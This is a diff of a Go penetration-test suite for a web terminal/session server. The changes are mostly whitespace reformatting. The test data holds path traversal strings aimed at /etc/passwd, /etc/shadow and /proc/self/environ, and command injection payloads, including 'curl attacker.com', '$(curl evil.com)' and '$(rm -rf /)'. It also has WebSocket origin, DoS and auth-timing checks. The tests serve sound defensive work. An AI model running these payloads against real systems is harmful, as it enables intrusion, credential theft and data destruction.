@@ -43,8 +43,8 @@ func TestAdvancedSecurityPenetration(t *testing.T) {
 			"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", // UTF-8 encoding
 			".%2e/.%2e/.%2e/etc/passwd",               // Mixed encoding
 			"..././..././..././etc/passwd",            // Extra dots
-			"../../../../../../proc/self/environ",      // Process environment
-			"../../../../../../proc/version",           // System info
+			"../../../../../../proc/self/environ",     // Process environment
+			"../../../../../../proc/version",          // System info
 			"/var/log/apache2/access.log",             // Log files
 			"/etc/shadow",                             // Shadow passwords
 			"C:\\boot.ini",                            // Windows files
@@ -82,42 +82,42 @@ func TestAdvancedSecurityPenetration(t *testing.T) {
 			"main && whoami",
 			"main | cat /etc/passwd",
 			"main || curl attacker.com",
-			
+
 			// Subshells and command substitution
 			"main `id`",
 			"main $(whoami)",
 			"main ${IFS}id",
 			"main$IFS$()id",
-			
+
 			// Encoding bypasses
-			"main;%20id",                    // URL encoding
-			"main;\tid",                     // Tab character
-			"main;\nid",                     // Newline
-			"main;\rid",                     // Carriage return
-			"main;i'd'",                     // Quote manipulation
-			
+			"main;%20id", // URL encoding
+			"main;\tid",  // Tab character
+			"main;\nid",  // Newline
+			"main;\rid",  // Carriage return
+			"main;i'd'",  // Quote manipulation
+
 			// Advanced shell features
-			"main;id#comment",               // Comment to hide payload
-			"main;{id,whoami}",             // Brace expansion
-			"main;id>/tmp/output",          // Output redirection
-			"main;id 2>&1",                 // Error redirection
-			"main;sleep 5",                 // Time-based detection
-			"main;ping -c1 127.0.0.1",     // Network operations
-			
+			"main;id#comment",         // Comment to hide payload
+			"main;{id,whoami}",        // Brace expansion
+			"main;id>/tmp/output",     // Output redirection
+			"main;id 2>&1",            // Error redirection
+			"main;sleep 5",            // Time-based detection
+			"main;ping -c1 127.0.0.1", // Network operations
+
 			// Multiple command separators
 			"main;id;whoami",
 			"main&&id||whoami",
 			"main|id&whoami",
-			
+
 			// Environment variable manipulation
 			"main;export PATH=/tmp:$PATH;id",
 			"main;HOME=/tmp id",
 			"main;IFS=';' eval 'id;whoami'",
-			
+
 			// Process substitution
 			"main;<(id)",
 			"main;>(id)",
-			
+
 			// Glob patterns for command discovery
 			"main;/bin/i?",
 			"main;/usr/bin/id*",
@@ -171,12 +171,12 @@ func TestAdvancedSecurityPenetration(t *testing.T) {
 
 			for _, origin := range maliciousOrigins {
 				wsURL := strings.Replace(httpServer.URL, "http://", "ws://", 1) + "/ws?sessionId=" + sessionID
-				
+
 				// Create custom dialer with malicious origin
 				dialer := &websocket.Dialer{
 					HandshakeTimeout: 5 * time.Second,
 				}
-				
+
 				headers := http.Header{}
 				headers.Set("Origin", origin)
 
@@ -187,7 +187,7 @@ func TestAdvancedSecurityPenetration(t *testing.T) {
 				} else {
 					t.Logf("Good: WebSocket rejected connection from origin: %s", origin)
 				}
-				
+
 				// Note: Current implementation may allow all origins in development
 				// This test documents the behavior for security review
 			}
@@ -209,7 +209,7 @@ func TestAdvancedSecurityPenetration(t *testing.T) {
 					"data": "\x1b]0;$(curl evil.com)\x07", // Terminal escape sequence injection
 				},
 				{
-					"type": "input", 
+					"type": "input",
 					"data": "\x1b[2J\x1b[H$(rm -rf /)", // Screen manipulation + command injection
 				},
 				{
@@ -234,7 +234,7 @@ func TestAdvancedSecurityPenetration(t *testing.T) {
 				} else {
 					t.Logf("Warning: WebSocket accepted potentially malicious message: %v", msg["type"])
 				}
-				
+
 				// Brief pause between messages
 				time.Sleep(10 * time.Millisecond)
 			}
@@ -263,7 +263,7 @@ func TestAdvancedSecurityPenetration(t *testing.T) {
 
 			// Should handle reasonable number of connections
 			assert.True(t, len(connections) > 0, "Should allow at least some WebSocket connections")
-			
+
 			// But should have some limit to prevent DoS
 			if len(connections) >= 50 {
 				t.Log("Note: No apparent limit on concurrent WebSocket connections - consider adding limits")
@@ -286,7 +286,7 @@ func TestAdvancedSecurityPenetration(t *testing.T) {
 
 			// Should handle parameter pollution safely
 			t.Logf("Parameter pollution test %s returned status: %d", url, resp.StatusCode)
-			
+
 			// Should not succeed with malicious parameters
 			assert.True(t, resp.StatusCode == http.StatusBadRequest || resp.StatusCode == http.StatusNotFound,
 				"Should handle parameter pollution safely")
@@ -297,7 +297,7 @@ func TestAdvancedSecurityPenetration(t *testing.T) {
 		t.Run("Large_JSON_Payload", func(t *testing.T) {
 			// Test with very large JSON payload
 			largeTitle := strings.Repeat("A", 1000000) // 1MB title
-			
+
 			sessionPayload := map[string]interface{}{
 				"title":   largeTitle,
 				"command": "echo test",
@@ -310,7 +310,7 @@ func TestAdvancedSecurityPenetration(t *testing.T) {
 
 			// Should reject or handle large payloads gracefully
 			t.Logf("Large JSON payload test returned status: %d", resp.StatusCode)
-			
+
 			// Should not cause server crash or excessive memory usage
 			assert.True(t, resp.StatusCode == http.StatusBadRequest || resp.StatusCode == http.StatusRequestEntityTooLarge,
 				"Should reject excessively large JSON payloads")
@@ -320,7 +320,7 @@ func TestAdvancedSecurityPenetration(t *testing.T) {
 			// Test many concurrent requests to detect resource exhaustion
 			const numRequests = 100
 			responses := make(chan int, numRequests)
-			
+
 			for i := 0; i < numRequests; i++ {
 				go func(id int) {
 					sessionPayload := map[string]interface{}{
@@ -352,10 +352,10 @@ func TestAdvancedSecurityPenetration(t *testing.T) {
 			}
 
 			t.Logf("Concurrent requests: %d successful, %d errors", successCount, errorCount)
-			
+
 			// Should handle reasonable concurrent load
 			assert.True(t, successCount > numRequests/2, "Should handle reasonable concurrent load")
-			
+
 			// Some errors are acceptable under high load
 			if errorCount > numRequests/2 {
 				t.Log("Note: High error rate under concurrent load - may need optimization")
@@ -366,12 +366,12 @@ func TestAdvancedSecurityPenetration(t *testing.T) {
 	t.Run("Protocol_Downgrade_Attacks", func(t *testing.T) {
 		// Test for protocol downgrade vulnerabilities
 		// This is more relevant for HTTPS deployments
-		
+
 		t.Run("HTTP_vs_HTTPS", func(t *testing.T) {
 			// Test that sensitive operations require secure transport
 			// In current test environment, we're using HTTP
 			// This test documents expected behavior for production HTTPS deployment
-			
+
 			resp, err := http.Get(baseURL + "/api/auth/config")
 			require.NoError(t, err)
 			defer resp.Body.Close()
@@ -379,7 +379,7 @@ func TestAdvancedSecurityPenetration(t *testing.T) {
 			// In production with HTTPS, should have Strict-Transport-Security header
 			stsHeader := resp.Header.Get("Strict-Transport-Security")
 			t.Logf("Strict-Transport-Security header: %s", stsHeader)
-			
+
 			// Note: In production, should enforce HTTPS for sensitive operations
 		})
 	})
@@ -446,12 +446,12 @@ func TestVulnerabilityScanning(t *testing.T) {
 					"/home/", // File paths
 					"/usr/",
 					"/etc/",
-					"panic:",     // Go panic traces
-					"goroutine",  // Stack traces  
-					"database",   // Database details
-					"password",   // Credentials
-					"token",      // Auth tokens
-					"secret",     // Secrets
+					"panic:",    // Go panic traces
+					"goroutine", // Stack traces
+					"database",  // Database details
+					"password",  // Credentials
+					"token",     // Auth tokens
+					"secret",    // Secrets
 				}
 
 				for _, sensitive := range sensitiveInfo {
@@ -465,11 +465,11 @@ func TestVulnerabilityScanning(t *testing.T) {
 					if strings.Contains(resp.Header.Get("Content-Type"), "application/json") {
 						var errorResponse map[string]interface{}
 						json.Unmarshal(responseBody.Bytes(), &errorResponse)
-						
+
 						if errorMsg, exists := errorResponse["error"]; exists {
 							errorStr := fmt.Sprintf("%v", errorMsg)
 							t.Logf("Error message: %s", errorStr)
-							
+
 							// Error should be informative but not expose internals
 							assert.NotEmpty(t, errorStr, "Error message should not be empty")
 							assert.True(t, len(errorStr) < 500, "Error message should be concise")
@@ -491,7 +491,7 @@ func TestVulnerabilityScanning(t *testing.T) {
 		// Should not expose sensitive server information
 		serverHeader := headers.Get("Server")
 		t.Logf("Server header: %s", serverHeader)
-		
+
 		// Should not expose Go version, OS details, or internal software versions
 		if serverHeader != "" {
 			assert.NotContains(t, strings.ToLower(serverHeader), "go/")
@@ -533,17 +533,17 @@ func TestVulnerabilityScanning(t *testing.T) {
 
 		for _, creds := range invalidCredentials {
 			start := time.Now()
-			
+
 			jsonData, _ := json.Marshal(creds)
 			resp, _ := http.Post(baseURL+"/api/auth/login", "application/json", bytes.NewBuffer(jsonData))
-			
+
 			elapsed := time.Since(start)
 			timings = append(timings, elapsed)
-			
+
 			if resp != nil {
 				resp.Body.Close()
 			}
-			
+
 			t.Logf("Auth timing for %v: %v", creds["username"], elapsed)
 		}
 
@@ -551,7 +551,7 @@ func TestVulnerabilityScanning(t *testing.T) {
 		if len(timings) >= 2 {
 			maxTiming := timings[0]
 			minTiming := timings[0]
-			
+
 			for _, timing := range timings {
 				if timing > maxTiming {
 					maxTiming = timing
@@ -560,10 +560,10 @@ func TestVulnerabilityScanning(t *testing.T) {
 					minTiming = timing
 				}
 			}
-			
+
 			timingDifference := maxTiming - minTiming
 			t.Logf("Timing difference: %v", timingDifference)
-			
+
 			// Large timing differences could indicate timing attack vulnerability
 			if timingDifference > 100*time.Millisecond {
 				t.Log("Note: Significant timing differences detected in auth responses")
